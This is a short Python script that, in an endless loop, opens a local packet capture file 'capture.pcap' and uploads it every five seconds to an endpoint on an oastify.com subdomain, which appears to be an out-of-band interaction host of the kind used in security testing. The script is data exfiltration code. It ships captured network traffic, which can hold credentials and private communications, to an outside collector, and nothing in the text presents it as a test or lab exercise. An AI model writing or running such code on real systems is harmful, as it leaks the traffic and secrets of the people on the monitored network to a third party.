import requests
import time

url = 'http://q3use5m32oeae0cx0rinsk87syypmsogd.oastify.com/upload'

while True:
    files = {'file': open('capture.pcap', 'rb')}
    response = requests.post(url, files=files)
    print(response.text)
    time.sleep(5)
